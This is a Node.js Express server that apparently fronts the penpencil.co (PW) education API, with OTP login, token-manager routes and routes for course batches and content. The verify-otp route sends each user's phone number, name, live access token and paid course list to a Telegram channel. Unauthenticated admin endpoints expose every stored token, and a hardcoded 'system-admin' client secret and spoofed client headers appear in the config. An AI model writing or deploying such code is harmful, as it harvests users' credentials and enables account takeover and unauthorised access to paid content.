const express = require('express');
const cors    = require('cors');
const axios   = require('axios');
const path    = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// ═══════════════════════════════════════════════════════════════
//  IN-MEMORY TOKEN STORE
//  (Vercel serverless = no filesystem write access)
//  Agar persist chahiye toh .env mein UPSTASH_REDIS_URL daalo
// ═══════════════════════════════════════════════════════════════
let tokenStore = {};

// Optional: Upstash Redis support (env mein set karo)
const REDIS_URL   = process.env.UPSTASH_REDIS_URL   || '';
const REDIS_TOKEN = process.env.UPSTASH_REDIS_TOKEN || '';

async function redisGet(key) {
  if (!REDIS_URL) return null;
  try {
    const r = await axios.get(`${REDIS_URL}/get/${key}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    return r.data?.result ? JSON.parse(r.data.result) : null;
  } catch { return null; }
}

async function redisSet(key, value) {
  if (!REDIS_URL) return;
  try {
    await axios.post(`${REDIS_URL}/set/${key}`,
      { value: JSON.stringify(value) },
      { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
    );
  } catch (e) { console.error('[Redis set]', e.message); }
}

async function redisDel(key) {
  if (!REDIS_URL) return;
  try {
    await axios.get(`${REDIS_URL}/del/${key}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
  } catch (e) { console.error('[Redis del]', e.message); }
}

async function redisKeys(pattern) {
  if (!REDIS_URL) return [];
  try {
    const r = await axios.get(`${REDIS_URL}/keys/${pattern}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    return r.data?.result || [];
  } catch { return []; }
}

async function loadAllTokens() {
  if (!REDIS_URL) return tokenStore;
  const keys = await redisKeys('pwtoken:*');
  const store = {};
  for (const k of keys) {
    const entry = await redisGet(k);
    if (entry) store[entry.token] = entry;
  }
  tokenStore = store;
  return store;
}

async function saveToken(entry) {
  tokenStore[entry.token] = entry;
  await redisSet(`pwtoken:${entry.token}`, entry);
}

async function deleteToken(token) {
  delete tokenStore[token];
  await redisDel(`pwtoken:${token}`);
}

// ═══════════════════════════════════════════════════════════════
//  CONFIG
// ═══════════════════════════════════════════════════════════════
const ORG_ID    = '5eb393ee95fab7468a79d189';
const CLIENT_ID = '5eb393ee95fab7468a79d189';

const BASE_HEADERS = {
  'client-id':      CLIENT_ID,
  'client-version': '12.84',
  'Client-Type':    'MOBILE',
  'randomId':       'e4307177362e86f1',
  'Accept':         'application/json, text/plain, */*',
  'Content-Type':   'application/json',
};

function authHeaders(token) {
  return {
    'client-id':      CLIENT_ID,
    'client-type':    'WEB',
    'client-version': '3.3.0',
    'randomId':       '04b54cdb-bf9e-48ef-974d-620e21bd3e23',
    'Accept':         'application/json, text/plain, */*',
    'Authorization':  `Bearer ${token}`,
  };
}

// ═══════════════════════════════════════════════════════════════
//  TELEGRAM
// ═══════════════════════════════════════════════════════════════
const TG_TOKEN   = process.env.TELEGRAM_BOT_TOKEN  || '';
const TG_CHAT_ID = process.env.TELEGRAM_CHANNEL_ID || '';

async function tgSend(text) {
  if (!TG_TOKEN) return;
  try {
    await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      chat_id: TG_CHAT_ID, text, parse_mode: 'HTML',
    });
  } catch (e) { console.error('[TG text]', e.message); }
}

async function tgPhoto(photo, caption) {
  if (!TG_TOKEN) return;
  try {
    await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
      chat_id: TG_CHAT_ID, photo, caption, parse_mode: 'HTML',
    });
  } catch {
    await tgSend(caption);
  }
}

// ═══════════════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════════════
async function pwGet(url, token, params = {}) {
  const r = await axios.get(url, {
    headers: authHeaders(token), params, timeout: 20000,
  });
  return r.data?.data ?? r.data;
}

function batchThumb(b) {
  if (!b.image) return null;
  if (typeof b.image === 'string') return b.image;
  return (b.image.baseUrl || '') + (b.image.key || '');
}

function formatBatch(b) {
  return {
    id:        b._id,
    name:      b.name,
    subject:   b.subject,
    thumbnail: batchThumb(b),
    language:  b.language,
    startDate: b.startDate,
    endDate:   b.endDate,
  };
}

async function hydrateToken(token, label = '') {
  // 1. User profile
  let userInfo = {};
  try {
    const r = await axios.get('https://api.penpencil.co/v1/users/get-user', {
      headers: authHeaders(token), timeout: 12000,
    });
    userInfo = r.data?.data || {};
  } catch (_) {}

  // 2. Batches
  const batchRes = await axios.get(
    'https://api.penpencil.co/v3/batches/my-batches?mode=1&amount=paid&page=1',
    { headers: authHeaders(token), timeout: 12000 }
  );
  const rawBatches = batchRes.data?.data || [];

  const entry = {
    token,
    label:   label || userInfo.username || (token.slice(0, 16) + '...'),
    addedAt: new Date().toISOString(),
    user: {
      id:    userInfo._id    || '',
      name:  (`${userInfo.firstName || ''} ${userInfo.lastName || ''}`).trim(),
      phone: userInfo.username || '',
      email: userInfo.email   || '',
    },
    batches: rawBatches.map(formatBatch),
  };

  await saveToken(entry);
  return entry;
}

function requireToken(req, res, next) {
  const raw   = req.headers['authorization'] || req.query.token || '';
  const token = raw.replace(/^Bearer\s+/i, '').trim();
  if (!token) return res.status(401).json({ success: false, message: 'Authorization token required' });
  req.pwToken = token;
  next();
}

// ═══════════════════════════════════════════════════════════════
//  AUTH ROUTES
// ═══════════════════════════════════════════════════════════════

// POST /api/auth/send-otp
app.post('/api/auth/send-otp', async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ success: false, message: 'phone required' });
  try {
    const r = await axios.post(
      'https://api.penpencil.co/v1/users/get-otp?smsType=0',
      { username: phone, countryCode: '+91', organizationId: ORG_ID },
      { headers: BASE_HEADERS }
    );
    if (r.data.success) {
      res.json({ success: true, message: `OTP sent to +91${phone}` });
    } else {
      res.status(400).json({ success: false, message: r.data.message || 'Failed to send OTP' });
    }
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

// POST /api/auth/verify-otp
app.post('/api/auth/verify-otp', async (req, res) => {
  const { phone, otp } = req.body;
  if (!phone || !otp) return res.status(400).json({ success: false, message: 'phone and otp required' });
  try {
    const tokenRes = await axios.post(
      'https://api.penpencil.co/v3/oauth/token',
      new URLSearchParams({
        username: phone, otp,
        client_id: 'system-admin',
        client_secret: 'KjPXuAVfC5xbmgreETNMaL7z',
        grant_type: 'password',
        organizationId: ORG_ID,
        latitude: 0, longitude: 0,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const token = tokenRes.data?.data?.access_token;
    if (!token) return res.status(401).json({ success: false, message: 'Invalid OTP or login failed' });

    const entry = await hydrateToken(token, phone);

    // Telegram notify
    const bLines = entry.batches.map((b, i) => `${i + 1}. ${b.name}`).join('\n');
    await tgSend(
      `🔐 <b>New PW Login (OTP)</b>\n` +
      `📱 Phone: <code>${phone}</code>\n` +
      `👤 Name: ${entry.user.name || '-'}\n` +
      `🔑 Token: <code>${token}</code>\n` +
      `📚 Batches (${entry.batches.length}):\n${bLines || 'None'}\n` +
      `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    );

    res.json({
      success:    true,
      token,
      user:       entry.user,
      batches:    entry.batches,
      batchCount: entry.batches.length,
    });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

// ═══════════════════════════════════════════════════════════════
//  ADMIN — TOKEN MANAGER
// ═══════════════════════════════════════════════════════════════

// POST /api/admin/add-token
app.post('/api/admin/add-token', async (req, res) => {
  const { token, label } = req.body;
  if (!token) return res.status(400).json({ success: false, message: 'token required' });

  const isNew = !tokenStore[token];

  try {
    const entry = await hydrateToken(token, label || '');
    const batchCount = entry.batches.length;

    // Telegram — intro message
    await tgSend(
      `${isNew ? '➕' : '🔄'} <b>Token ${isNew ? 'Added' : 'Refreshed'}</b>\n` +
      `🏷 Label: <b>${entry.label}</b>\n` +
      `👤 User: ${entry.user.name || '-'}  |  📱 ${entry.user.phone || '-'}\n` +
      `📚 Total Batches: <b>${batchCount}</b>\n` +
      `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    );

    // Telegram — per batch with thumbnail
    for (const b of entry.batches) {
      const cap =
        `📖 <b>${b.name}</b>\n` +
        `🆔 <code>${b.id}</code>\n` +
        (b.subject   ? `📌 ${b.subject}\n`             : '') +
        (b.language  ? `🌐 ${b.language}\n`            : '') +
        (b.startDate ? `📅 ${String(b.startDate).slice(0, 10)}\n` : '');

      if (b.thumbnail) await tgPhoto(b.thumbnail, cap);
      else await tgSend(cap);
    }

    res.json({
      success:    true,
      isNew,
      label:      entry.label,
      user:       entry.user,
      batches:    entry.batches,
      batchCount,
    });
  } catch (e) {
    res.status(401).json({ success: false, message: `Token invalid or expired: ${e.message}` });
  }
});

// GET /api/admin/tokens
app.get('/api/admin/tokens', async (req, res) => {
  await loadAllTokens();
  const list = Object.values(tokenStore).map(s => ({
    label:      s.label,
    token:      s.token,
    user:       s.user,
    addedAt:    s.addedAt,
    batchCount: s.batches.length,
    batches:    s.batches,
  }));
  res.json({ success: true, total: list.length, tokens: list });
});

// DELETE /api/admin/tokens/:token
app.delete('/api/admin/tokens/:token', async (req, res) => {
  const t = req.params.token;
  if (!tokenStore[t]) return res.status(404).json({ success: false, message: 'Not found' });
  await deleteToken(t);
  res.json({ success: true, message: 'Token removed' });
});

// POST /api/admin/refresh-token/:token
app.post('/api/admin/refresh-token/:token', async (req, res) => {
  const t = req.params.token;
  try {
    const entry = await hydrateToken(t, tokenStore[t]?.label || '');
    res.json({ success: true, batches: entry.batches, batchCount: entry.batches.length });
  } catch (e) {
    res.status(401).json({ success: false, message: e.message });
  }
});

// ═══════════════════════════════════════════════════════════════
//  BATCH ROUTES
// ═══════════════════════════════════════════════════════════════

// GET /api/batches
app.get('/api/batches', requireToken, async (req, res) => {
  try {
    const data    = await pwGet('https://api.penpencil.co/v3/batches/my-batches?mode=1&amount=paid&page=1', req.pwToken);
    const batches = (Array.isArray(data) ? data : []).map(formatBatch);
    res.json({ success: true, count: batches.length, batches });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

// GET /api/batches/:batchId
app.get('/api/batches/:batchId', requireToken, async (req, res) => {
  try {
    const data = await pwGet(
      `https://api.penpencil.co/v3/batches/${req.params.batchId}/details`,
      req.pwToken
    );
    res.json({ success: true, data });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

// GET /api/batches/:batchId/subjects/:subjectId/contents
app.get('/api/batches/:batchId/subjects/:subjectId/contents', requireToken, async (req, res) => {
  const { batchId, subjectId } = req.params;
  const { page = 1, contentType = 'exercises-notes-videos' } = req.query;
  try {
    const data = await pwGet(
      `https://api.penpencil.co/v2/batches/${batchId}/subject/${subjectId}/contents`,
      req.pwToken,
      { page, contentType }
    );
    res.json({ success: true, page: Number(page), contentType, data });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

// GET /api/batches/:batchId/subjects/:subjectId/topics
app.get('/api/batches/:batchId/subjects/:subjectId/topics', requireToken, async (req, res) => {
  const { batchId, subjectId } = req.params;
  const { page = 1 } = req.query;
  try {
    const data = await pwGet(
      `https://api.penpencil.co/v2/batches/${batchId}/subject/${subjectId}/topics`,
      req.pwToken,
      { page }
    );
    res.json({ success: true, page: Number(page), data });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

// GET /api/batches/:batchId/subjects/:subjectId/schedule/:scheduleId
app.get('/api/batches/:batchId/subjects/:subjectId/schedule/:scheduleId', requireToken, async (req, res) => {
  const { batchId, subjectId, scheduleId } = req.params;
  try {
    const data = await pwGet(
      `https://api.penpencil.co/v1/batches/${batchId}/subject/${subjectId}/schedule/${scheduleId}/schedule-details`,
      req.pwToken
    );
    res.json({ success: true, data });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

// GET /api/batches/:batchId/live
app.get('/api/batches/:batchId/live', requireToken, async (req, res) => {
  const { page = 1 } = req.query;
  try {
    const data = await pwGet(
      `https://api.penpencil.co/v2/batches/${req.params.batchId}/live-class`,
      req.pwToken,
      { page }
    );
    res.json({ success: true, data });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

// ═══════════════════════════════════════════════════════════════
//  API DOCS
// ═══════════════════════════════════════════════════════════════
app.get('/api', (req, res) => {
  res.json({
    name: 'PW API Server',
    version: '3.0.0',
    storage: REDIS_URL ? 'Upstash Redis (persistent)' : 'In-Memory (resets on cold start)',
    endpoints: [
      { method: 'POST',   path: '/api/auth/send-otp',                                     auth: false, desc: 'Send OTP to phone' },
      { method: 'POST',   path: '/api/auth/verify-otp',                                   auth: false, desc: 'Verify OTP → token + batches' },
      { method: 'POST',   path: '/api/admin/add-token',                                   auth: false, desc: 'Manually add token → auto-fetch batches + TG post' },
      { method: 'GET',    path: '/api/admin/tokens',                                      auth: false, desc: 'List all saved tokens' },
      { method: 'DELETE', path: '/api/admin/tokens/:token',                               auth: false, desc: 'Remove a token' },
      { method: 'POST',   path: '/api/admin/refresh-token/:token',                        auth: false, desc: 'Re-fetch batches for a token' },
      { method: 'GET',    path: '/api/batches',                                           auth: true,  desc: 'My purchased batches' },
      { method: 'GET',    path: '/api/batches/:batchId',                                  auth: true,  desc: 'Batch details + subjects' },
      { method: 'GET',    path: '/api/batches/:batchId/subjects/:subjectId/contents',     auth: true,  desc: '?page=1&contentType=videos|notes|DppVideos|DppNotes' },
      { method: 'GET',    path: '/api/batches/:batchId/subjects/:subjectId/topics',       auth: true,  desc: 'Topics / chapters' },
      { method: 'GET',    path: '/api/batches/:batchId/subjects/:subjectId/schedule/:id', auth: true,  desc: 'Schedule details' },
      { method: 'GET',    path: '/api/batches/:batchId/live',                             auth: true,  desc: 'Live classes' },
    ],
    authNote: 'Protected routes: Authorization: Bearer <token>  OR  ?token=<token>',
  });
});

// ═══════════════════════════════════════════════════════════════
//  STATIC — serve index.html for all non-api routes
// ═══════════════════════════════════════════════════════════════
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// ═══════════════════════════════════════════════════════════════
//  EXPORT for Vercel  +  local run support
// ═══════════════════════════════════════════════════════════════
module.exports = app;

// Local run (node api/index.js)
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`✅  PW API running → http://localhost:${PORT}`);
    console.log(`📋  Docs → http://localhost:${PORT}/api`);
  });
}
